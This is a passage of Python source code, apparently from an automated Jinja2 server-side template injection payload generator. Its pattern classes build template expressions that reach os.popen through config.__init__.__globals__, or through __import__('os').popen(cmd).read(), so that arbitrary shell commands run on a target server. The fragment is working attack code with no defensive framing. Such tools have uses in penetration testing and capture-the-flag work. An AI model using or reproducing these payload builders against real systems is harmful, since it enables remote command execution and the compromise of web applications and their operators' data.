        self.require(PlainPattern, "(")
        self.require(PlainPattern, ")")
        self.require(ConcatedAttrItemPattern, (ConfigPattern, ), (
            (ClassAttrPattern, "__init__"),
            (AttrPattern, "__globals__"),
            (AttrPattern, "values")
        ))
        self.require(StrPattern, "popen")

    def _generate(self):
        return "(%s)%s" % (
            self.use(ConcatedAttrItemPattern, (ConfigPattern, ), (
                (ClassAttrPattern, "__init__"),
                (AttrPattern, "__globals__"),
                (AttrPattern, "values")
            )),
            "()" +
            "|selectattr(%s)" % (
                self.use(StrPattern, "popen")
            ) +
            "|list|first"
        )


class OSPopenPattern(BasePattern):
    pass


class OSPopenPattern1(OSPopenPattern):
    def __init__(self, cmd):
        super().__init__()
        self.cmd = cmd.replace("'", "\\'")
        self.require(
            EvalPattern, f"__import__('os').popen('{self.cmd}').read()")

    def _generate(self):
        return self.use(EvalPattern, f"__import__('os').popen('{self.cmd}').read()")


class OSPopenPattern2(OSPopenPattern):

    def __init__(self, cmd):
        super().__init__()
        self.cmd = cmd
        self.require(ModOSPattern)
        self.require(AttrPattern, "popen")
        self.require(StrPattern, self.cmd)
        self.require(AttrPattern, "read")
        pass

    def _generate(self):
        return "%s(%s)%s()" % (
            self.use(ModOSPattern) +
            self.use(AttrPattern, "popen"),
            self.use(StrPattern, self.cmd),
            self.use(AttrPattern, "read")
        )
